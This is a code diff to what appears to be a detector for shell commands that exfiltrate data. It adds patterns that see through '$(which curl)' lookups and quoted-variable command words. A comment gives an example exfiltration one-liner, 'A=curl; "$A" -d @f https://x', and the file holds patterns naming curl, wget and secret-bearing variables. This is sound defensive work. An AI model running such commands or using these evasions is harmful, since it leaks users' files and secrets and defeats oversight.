@@ -429,6 +429,8 @@ _MAX_NETWORK_ACTION_CHARS = 65_536
 _NETWORK_CLIENT_FAST_PATTERN = re.compile(r"(?i)\b(?:curl|wget|https?)(?:\.exe)?\b")
 _NETWORK_CLIENT_PATTERN = _NETWORK_CLIENT_FAST_PATTERN
 _NETWORK_EXECUTABLES = ("curl", "wget", "http", "https")
+# ``$(command -v curl)`` and ``$(which curl)`` print where curl is, so as a command word they run curl.
+_COMMAND_LOOKUP_RE = re.compile(r"(?:\$\(|`)\s*(?:command\s+-v|which)\s+([\w.+-]+)\s*(?:\)|`)")
 _SECRET_VAR_NAME_RE = re.compile(
     r"^\$(?:\{[A-Za-z_0-9]*(?i:token|key|secret|password)[A-Za-z_0-9]*\}|[A-Za-z_0-9]*(?i:token|key|secret|password)[A-Za-z_0-9]*)"
 )
@@ -4448,7 +4450,7 @@ def _is_network_exfiltration_command(cmd_text, _depth=0):
         if _is_network_exfiltration_command(sub, _depth=_depth + 1):
             return True
 
-    tokens = _network_shell_tokens(cmd_text)
+    tokens = _network_shell_tokens(_COMMAND_LOOKUP_RE.sub(r"\1", cmd_text))
     if not tokens:
         return False
 
@@ -4501,6 +4503,9 @@ def _is_network_exfiltration_command(cmd_text, _depth=0):
             command = [*command[:cmd_idx], *command_word.split(), *command[cmd_idx + 1 :]]
             if cmd_idx >= len(command):
                 continue
+        elif command[cmd_idx].startswith('"$'):
+            # A quoted variable is the one word it holds: ``A=curl; "$A" -d @f https://x`` runs curl.
+            command = [*command[:cmd_idx], command_word, *command[cmd_idx + 1 :]]
 
         executable = _shell_executable(command[cmd_idx]).removesuffix(".exe")
 
